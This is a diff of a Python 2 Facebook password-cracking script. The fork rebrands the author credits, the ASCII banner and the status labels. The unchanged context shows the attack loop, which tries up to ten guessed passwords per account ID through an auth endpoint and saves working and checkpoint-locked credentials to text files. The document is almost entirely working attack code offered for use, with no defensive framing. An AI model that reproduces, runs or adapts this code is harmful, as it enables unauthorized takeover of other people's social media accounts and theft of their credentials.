@@ -1,8 +1,8 @@
 #coding=utf-8
 #!/usr/bin/python2
-#source code by Tech Abm
+#source code by Afridi Tricks
 #codded by Tech Abm
-# do no try to decode it
+# Try to decode it
 try:
     import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
     from multiprocessing.pool import ThreadPool
@@ -38,18 +38,18 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 
 banner="""
-\033[1;97m             d8888 888888b.   888b     d888 \033[1;0m
-\033[1;91m            d88888 888  "88b  8888b   d8888 \033[1;0m
-\033[1;97m           d88P888 888  .88P  88888b.d88888 \033[1;0m
-\033[1;91m          d88P 888 8888888K.  888Y88888P888 \033[1;0m
-\033[1;97m         d88P  888 888  "Y88b 888 Y888P 888 \033[1;0m
-\033[1;91m        d88P   888 888    888 888  Y8P  888 \033[1;0m
-\033[1;97m       d8888888888 888   d88P 888   "   888 \033[1;0m
-\033[1;91m      d88P     888 8888888P"  888       888 \033[1;0m
+\033[1;97m             d8888 888    888 888    d8P \033[1;0m
+\033[1;91m            d88888 888    888 888   d8P \033[1;0m
+\033[1;97m           d88P888 888    888 888  d8P \033[1;0m
+\033[1;91m          d88P 888 8888888888 888d88K \033[1;0m
+\033[1;97m         d88P  888 888    888 8888888b \033[1;0m
+\033[1;91m        d88P   888 888    888 888  Y88b \033[1;0m
+\033[1;97m       d8888888888 888    888 888   Y88b \033[1;0m
+\033[1;91m      d88P     888 888    888 888    Y88b \033[1;0m
 \033[1;97m--------------------------------------------------
-\033[1;93m(!)\033[1;97m Author   : Tech-Abm
-\033[1;93m(!)\033[1;97m Github   : https://github.com/Tech-abm
-\033[1;93m(!)\033[1;97m Fb Page  : https://m.facebook.com/Techabm
+\033[1;93m(!)\033[1;97m Author   : Ijaz Afridi
+\033[1;93m(!)\033[1;97m Github   : https://github.com/Mrbadmash
+\033[1;93m(!)\033[1;97m Fb Page  : https://m.facebook.com/Cyber.Expert302
 \033[1;93m(!)\033[1;97m Api Key  : CFBID11N0V20SPIDABMID11N
 \033[1;97m--------------------------------------------------
 """
@@ -308,14 +308,14 @@ def crack_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;91m[CheckPoint] "+uid+" | "+pass1)
+					print("\033[1;91m[AHK-CP] "+uid+" | "+pass1)
 					cp = open("cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -325,14 +325,14 @@ def crack_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;91m[CheckPoint] "+uid+" | "+pass2)
+							print("\033[1;91m[AHK-CP] "+uid+" | "+pass2)
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -342,14 +342,14 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;91m[CheckPoint] "+uid+" | "+pass3)
+									print("\033[1;91m[AHK-CP] "+uid+" | "+pass3)
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -359,14 +359,14 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\033[1;91m[CheckPoint] "+uid+" | "+pass4)
+											print("\033[1;91m[AHK-CP] "+uid+" | "+pass4)
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -376,14 +376,14 @@ def crack_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\033[1;91m[CheckPoint] "+uid+" | "+pass5)
+													print("\033[1;91m[AHK-CP] "+uid+" | "+pass5)
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -393,14 +393,14 @@ def crack_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\033[1;91m[CheckPoint] "+uid+" | "+pass6)
+															print("\033[1;91m[AHK-CP] "+uid+" | "+pass6)
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -410,14 +410,14 @@ def crack_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("\033[1;91m[CheckPoint] "+uid+" | "+pass7)
+																	print("\033[1;91m[AHK-CP] "+uid+" | "+pass7)
 																	cp = open("cp.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -427,14 +427,14 @@ def crack_select():
 															                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
 															                q = json.loads(data)
 															                if "loc" in q:
-																                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
+																                print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
 																                ok = open("ok.txt","a")
 																                ok.write(uid+" | "+pass8+"\n")
 																                ok.close()
 																                oks.append(uid+pass8)
 															                else:
 																                if "www.facebook.com" in q["error"]:
-																	                print("\033[1;91m[CheckPoint] "+uid+" | "+pass8)
+																	                print("\033[1;91m[AHK-CP] "+uid+" | "+pass8)
 																	                cp = open("cp.txt","a")
 																	                cp.write(uid+" | "+pass8+"\n")
 																	                cp.close()
@@ -444,14 +444,14 @@ def crack_select():
 															                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
 															                                q = json.loads(data)
 															                                if "loc" in q:
-																                                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
+																                                print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
 																                                ok = open("ok.txt","a")
 																                                ok.write(uid+" | "+pass9+"\n")
 																                                ok.close()
 																                                oks.append(uid+pass9)
 															                                else:
 																                                if "www.facebook.com" in q["error"]:
-																	                                print("\033[1;91m[CheckPoint] "+uid+" | "+pass9)
+																	                                print("\033[1;91m[AHK-CP] "+uid+" | "+pass9)
 																	                                cp = open("cp.txt","a")
 																	                                cp.write(uid+" | "+pass9+"\n")
 																	                                cp.close()
@@ -461,14 +461,14 @@ def crack_select():
 															                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
 															                                                q = json.loads(data)
 															                                                if "loc" in q:
-																                                                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
+																                                                print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
 																                                                ok = open("ok.txt","a")
 																                                                ok.write(uid+" | "+pass10+"\n")
 																                                                ok.close()
 																                                                oks.append(uid+pass10)
 															                                                else:
 																                                                if "www.facebook.com" in q["error"]:
-																	                                                print("\033[1;91m[CheckPoint] "+uid+" | "+pass10)
+																	                                                print("\033[1;91m[AHK-CP] "+uid+" | "+pass10)
 																	                                                cp = open("cp.txt","a")
 																	                                                cp.write(uid+" | "+pass10+"\n")
 																	                                                cp.close()
@@ -589,14 +589,14 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("successful.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;91m[CheckPoint] "+uid+" | "+pass1+"\033[0;97m")
+					print("\033[1;91m[AHK-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -605,14 +605,14 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("successful.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;91m[CheckPoint] "+uid+" | "+pass2+"\033[0;97m")
+							print("\033[1;91m[AHK-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -621,14 +621,14 @@ def choice_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("successful.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;91m[CheckPoint] "+uid+" | "+pass3+"\033[0;97m")
+									print("\033[1;91m[AHK-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -637,14 +637,14 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("successful.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print(" \033[1;91m[CheckPoint] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;91m[AHK-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -653,14 +653,14 @@ def choice_select():
 									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 									                q = json.loads(data)
 									                if "loc" in q:
-										                print("\033[1;92m[Successful] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
+										                print("\033[1;92m[AHK-OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
 										                ok = open("successful.txt", "a")
 										                ok.write(uid+" | "+pass5+"\n")
 										                ok.close()
 										                oks.append(uid+pass5)
 									                else:
 										                if "www.facebook.com" in q["error"]:
-											                print(" \033[1;91m[CheckPoint] "+uid+" | "+pass5+"\033[0;97m")
+											                print(" \033[1;91m[AHK-CP] "+uid+" | "+pass5+"\033[0;97m")
 											                cp = open("checkpoint.txt","a")
 											                cp.write(uid+" | "+pass5+"\n")
 											                cp.close()
